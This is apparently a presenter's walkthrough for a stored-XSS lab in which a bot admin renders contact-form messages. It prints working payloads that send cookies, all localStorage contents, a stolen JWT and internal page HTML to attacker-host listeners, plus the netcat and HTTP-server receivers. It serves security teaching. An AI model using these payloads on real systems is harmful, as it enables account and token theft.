# Step-by-Step Presentation Flow

This guide contains the live walkthrough for the lab presentation.

## Step 1: show the public application

Open:

```text
http://cross.fit
```

Explain that:

- the user-facing entrypoint is the public site
- the contact form stores the submitted message
- the page source contains a small operational hint that messages are reviewed from `backend.cross.fit`

## Step 2: confirm backend isolation

From the attacker machine, try:

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Expected:

- the attacker does not get the internal panel
- the connection closes or returns a non-success response

This establishes that direct access to `backend.cross.fit` is not available from the attacker side.

## Step 3: start a simple HTTP listener on the attacker side

Run this on the attacker machine:

```bash
python3 -m http.server 8000
```

Expected:

- the terminal prints a log line for every HTTP request received
- no extra code is needed on the attacker side

## Step 4: submit a probe payload through the public form

Use a payload that only makes a request to the attacker-controlled HTTP server:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

If attacker and lab are on the same host, use:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

Submit it through the public form on `cross.fit`, or with `curl`.

## Step 5: wait for the worker

The worker logs in as admin to `backend.cross.fit`, opens the next message, renders it, and marks it as processed.

You can watch it with:

```bash
docker compose logs -f worker
```

## Step 6: show the incoming request on the attacker server

Expected on the attacker machine:

```text
"GET /ping HTTP/1.1" 404 -
```

The `404` is acceptable. The relevant fact is that the request reached the attacker-controlled server.

## Step 7: explain the conclusion

At this point you can state:

- the attacker never browsed `backend.cross.fit` directly
- the public form stored attacker-controlled input
- the privileged browser session attached to `backend.cross.fit` executed the payload
- this is enough to confirm that the internal panel is vulnerable to stored XSS

## Step 8: prepare a manual listener for credential theft

At this point the next question is whether the privileged browser stores any reusable credential in JavaScript-accessible storage.

On the attacker machine, start a simple listener for `GET` requests:

```bash
python3 -m http.server 8000
```

## Step 9: try to steal the session cookie first

The first quick probe is to try `document.cookie`, because that payload is short and fits comfortably in the public form.

Payload:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
```

Same-host variation:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
```

Expected on the attacker machine:

- one incoming `GET /collect`
- the query may be empty or may not contain a useful session cookie

With the current lab architecture, this is the signal that the interesting credential is probably not stored as a classic session cookie.

## Step 10: prepare the `localStorage` scan

The next step is to inspect `localStorage`. The obvious inline payload is:

At this point you do not yet know how the internal credential is stored, so the realistic move is to enumerate browser storage first.

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://attacker_machine_ip:8000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

Same-host variation:

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://docker_host_gateway_ip:8000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

That payload is too large for the current public form because the `message` field is limited to `250` characters.

## Step 11: move the `localStorage` scan to an external JavaScript file

Serve a helper file from the attacker machine instead.

Start a static server from the repository root:

```bash
python3 -m http.server 8000
```

Served file:

```text
tools/payload-localstorage-scan.js
```

Minimal stored payload:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Same-host variation:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Expected on the attacker machine:

- one or more incoming `GET /collect`
- each request contains a `key=...` and `value=...`

## Step 11.1: identify the JWT-shaped value

From those requests, look for a value with the usual JWT structure:

```text
header.payload.signature
```

In this lab, that discovery should reveal:

- a `localStorage` key named `gym_internal_token`
- a value beginning with `eyJ...`

At that point you have justified, from observation, both the storage key and the fact that the privileged browser keeps a reusable credential accessible to JavaScript.

## Step 12: confirm the JWT theft explicitly

Once you already know the key name, you can switch to a shorter payload that steals only that JWT:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Same-host variation:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Expected on the attacker machine:

- one incoming `GET /collect`
- the query string contains `jwt=eyJ...`

This proves that the internal backend is not only vulnerable to stored XSS, but also that its browser-held credential can be stolen and isolated.

## Step 13: prepare a raw listener for the next exfiltration step

For the next step you want to receive a `POST` body manually, without using the bundled collector yet.

On the attacker machine, start a raw listener on port `9000`:

```bash
nc -lvnp 9000 | tee raw-http-request.txt
```

If your environment provides `ncat` instead of `nc`, use:

```bash
ncat -lvnp 9000 | tee raw-http-request.txt
```

Expected:

- the terminal stays waiting for a connection
- when the XSS fires, you will see the full HTTP request
- the request body will contain the Base64-encoded HTML

## Step 14: exfiltrate the front page of `backend.cross.fit`

Now use the XSS to request `/` from the same origin and send the returned HTML to the attacker listener.

The direct inline version is:

Payload:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

If attacker and lab are on the same host, the inline same-host variation would be:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://docker_host_gateway_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

That payload is also too large for the current public form because the `message` field is limited to `250` characters.

In practice, this step should be executed through an external JavaScript file loaded by a short stored XSS.

What each part of the payload does:

- `fetch('/')` requests the front page of the current origin
- `r.text()` reads the response as HTML
- `btoa(unescape(encodeURIComponent(html)))` converts that HTML to Base64
- `method: 'POST'` sends the Base64 in the request body
- `mode: 'no-cors'` is enough because the payload only needs to send the request
- `Content-Type: 'text/plain'` keeps the captured body easy to inspect by hand

## Step 14.1: load the front page exfiltration from an external JavaScript file

Because the inline payload does not fit in the `message` field, serve the external helper already included in the repo.

Start a static server from the repository root:

```bash
python3 -m http.server 8000
```

Served file:

```text
tools/payload-frontpage-login.js
```

Minimal stored payload:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js"></script>
```

Same-host variation:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-login.js"></script>
```

How this external payload works:

- it derives the attacker host from `document.currentScript.src`
- it fetches `/`
- it Base64-encodes the returned HTML
- it sends the result to `http://same-host:9000/internal-html`

If you need another port or path for the receiver, you can pass it in the script URL:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js?collectPort=9000&collectPath=/internal-html"></script>
```

## Step 15: wait for the worker and inspect the raw HTTP request

As before, the worker will render the stored message from `/admin/messages/next`.

Expected in the attacker terminal:

- `POST /internal-html`
- HTTP headers
- a blank line
- the raw Base64 body at the end of the request

## Step 16: decode the Base64 manually and save it as HTML

Copy only the request body, that is, the Base64 content after the blank line, and decode it:

```bash
printf '%s' 'BASE64_AQUI' | base64 -d > backend-frontpage.html
```

Then open the saved file:

```bash
xdg-open backend-frontpage.html
```

Or inspect it directly:

```bash
rg -n "<title>|<form|username|password" backend-frontpage.html
```

## Step 17: validate the expected result

The decoded HTML should correspond to the login page of `backend.cross.fit`.

You should find indicators such as:

- title similar to `Acceso interno`
- a login form
- `username`
- `password`

At this stage, you have demonstrated three concrete things:

- the backend is reachable indirectly through the privileged browser
- the privileged browser stores a reusable JWT accessible to JavaScript
- a plain request to `/` still lands on login unless the attacker explicitly reuses that JWT

## Step 18: move to the scripted collector later

Once this manual capture is understood and demonstrated, you can switch to:

```bash
python3 tools/collector.py
```

At that point the collector automates the parts you already proved by hand:

- receiving `GET` and `POST`
- showing the raw body
- decoding Base64 automatically
- making later payloads easier to inspect
